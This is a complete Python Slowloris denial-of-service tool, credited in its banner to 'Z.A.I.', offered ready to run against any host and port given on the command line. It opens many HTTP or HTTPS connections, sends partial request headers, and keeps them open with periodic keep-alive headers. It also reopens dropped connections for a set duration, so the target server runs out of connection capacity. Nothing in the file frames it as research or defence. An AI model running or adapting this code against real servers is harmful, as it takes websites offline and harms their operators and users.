#!/usr/bin/env python3
# Made By       Z.A.I. 💀

import argparse
import asyncio
import logging
import random
import socket
import ssl
import sys
import time
import os

def print_banner():
    os.system('')  # Enables ANSI escape chars in terminal (Windows compatible too)
    GREEN = '\033[1;32m'
    RESET = '\033[0m'
    print(GREEN + r"""
   ____          _       _               
  |__  |   ___  | |__   (_)  ___   _ __  
    / /   / _ \ | '_ \  | | / _ \ | '_ \ 
   / /_  | (_) || | | | | || (_) || | | |
  |____|  \___/ |_| |_| |_| \___/ |_| |_|

              Code By Zain 💀
""" + RESET)

print_banner()

# Argument parser setup
parser = argparse.ArgumentParser(description="Asynchronous Slowloris Tool - Made By Z.A.I.")
parser.add_argument("host", help="Target host")
parser.add_argument("-p", "--port", type=int, default=80, help="Target port")
parser.add_argument("-s", "--sockets", type=int, default=150, help="Number of sockets")
parser.add_argument("--https", action="store_true", help="Use HTTPS")
parser.add_argument("--sleeptime", type=int, default=15, help="Time between header sends")
parser.add_argument("--duration", type=int, help="Time in seconds to run the attack")
parser.add_argument("--logfile", help="File to log output")
args = parser.parse_args()

# Logger configuration
log_format = "[%(asctime)s] %(message)s"
logging.basicConfig(
    level=logging.INFO,
    format=log_format,
    datefmt="%Y-%m-%d %H:%M:%S",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler(args.logfile) if args.logfile else logging.NullHandler()
    ]
)

# User-Agent list for randomness
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "Mozilla/5.0 (X11; Linux x86_64)...",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12)..."
]

class SlowlorisSocket:
    def __init__(self, host, port, use_ssl=False):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.socket = None

    async def connect(self):
        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw_sock.settimeout(4)
            if self.use_ssl:
                context = ssl.create_default_context()
                self.socket = context.wrap_socket(raw_sock, server_hostname=self.host)
            else:
                self.socket = raw_sock
            self.socket.connect((self.host, self.port))
            self.send_line(f"GET /?{random.randint(0, 1000)} HTTP/1.1")
            self.send_header("Host", self.host)
            self.send_header("User-Agent", random.choice(USER_AGENTS))
            self.send_header("Accept-language", "en-US,en,q=0.5")
            return True
        except Exception as e:
            logging.debug(f"Failed to connect: {e}")
            return False

    def send_line(self, line):
        try:
            self.socket.send((line + "\r\n").encode("utf-8"))
        except Exception as e:
            logging.debug(f"Send line error: {e}")

    def send_header(self, name, value):
        self.send_line(f"{name}: {value}")

    def keep_alive(self):
        try:
            self.send_header("X-Keep-Alive", str(random.randint(1, 5000)))
            return True
        except Exception:
            return False

async def slowloris_attack():
    logging.info(f"Starting attack on {args.host}:{args.port} with {args.sockets} sockets")
    sockets = []
    start_time = time.time()

    # Create initial sockets
    for _ in range(args.sockets):
        s = SlowlorisSocket(args.host, args.port, args.https)
        if await s.connect():
            sockets.append(s)

    while True:
        if args.duration and (time.time() - start_time) > args.duration:
            logging.info("Attack duration complete. Exiting...")
            break

        logging.info(f"Sending keep-alive headers. Active sockets: {len(sockets)}")
        for s in sockets[:]:
            if not s.keep_alive():
                sockets.remove(s)

        while len(sockets) < args.sockets:
            s = SlowlorisSocket(args.host, args.port, args.https)
            if await s.connect():
                sockets.append(s)
            else:
                break

        await asyncio.sleep(args.sleeptime)

if __name__ == "__main__":
    try:
        asyncio.run(slowloris_attack())
    except KeyboardInterrupt:
        logging.info("Stopped by user")
